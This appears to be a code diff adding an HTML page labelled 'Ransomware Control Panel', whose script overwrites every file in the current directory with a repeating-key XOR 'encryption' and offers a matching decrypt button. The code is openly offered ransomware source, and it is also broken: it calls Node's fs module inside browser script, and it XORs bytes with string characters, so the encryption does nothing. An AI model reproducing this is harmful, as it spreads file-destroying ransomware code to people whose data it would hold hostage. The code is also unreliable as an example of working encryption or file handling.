@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ransomware Control Panel</title>
+</head>
+<body>
+  <h1>Ransomware Control Panel</h1>
+  <form>
+    <label for="key">Encryption Key:</label><br>
+    <input type="text" id="key" name="key">
+    <br><br>
+    <input type="submit" value="Encrypt">
+    <input type="submit" value="Decrypt">
+  </form>
+
+  <script>
+    const keyInput = document.getElementById("key");
+
+    const encryptButton = document.querySelector("input[type=submit][value=Encrypt]");
+    encryptButton.addEventListener("click", () => {
+      const key = keyInput.value;
+
+      // Encrypt the files using the key.
+      encryptFiles(key);
+    });
+
+    const decryptButton = document.querySelector("input[type=submit][value=Decrypt]");
+    decryptButton.addEventListener("click", () => {
+      const key = keyInput.value;
+
+      // Decrypt the files using the key.
+      decryptFiles(key);
+    });
+
+    function encryptFiles(key) {
+      // Get a list of all the files in the current directory.
+      const files = fs.readdirSync(".");
+
+      // Encrypt each file using the key.
+      files.forEach(file => {
+        fs.writeFileSync(file, encrypt(fs.readFileSync(file), key));
+      });
+    }
+
+    function decryptFiles(key) {
+      // Get a list of all the files in the current directory.
+      const files = fs.readdirSync(".");
+
+      // Decrypt each file using the key.
+      files.forEach(file => {
+        fs.writeFileSync(file, decrypt(fs.readFileSync(file), key));
+      });
+    }
+
+    function encrypt(data, key) {
+      // Convert the data to a byte array.
+      const dataBytes = new Uint8Array(data);
+
+      // Create a new byte array to store the encrypted data.
+      const encryptedBytes = new Uint8Array(dataBytes.length);
+
+      // Encrypt the data using the key.
+      for (let i = 0; i < dataBytes.length; i++) {
+        encryptedBytes[i] = dataBytes[i] ^ key[i % key.length];
+      }
+
+      // Return the encrypted data.
+      return encryptedBytes;
+    }
+
+    function decrypt(data, key) {
+      // Convert the data to a byte array.
+      const dataBytes = new Uint8Array(data);
+
+      // Create a new byte array to store the decrypted data.
+      const decryptedBytes = new Uint8Array(dataBytes.length);
+
+      // Decrypt the data using the key.
+      for (let i = 0; i < dataBytes.length; i++) {
+        decryptedBytes[i] = dataBytes[i] ^ key[i % key.length];
+      }
+
+      // Return the decrypted data.
+      return decryptedBytes;
+    }
+  </script>
+</body>
+</html>
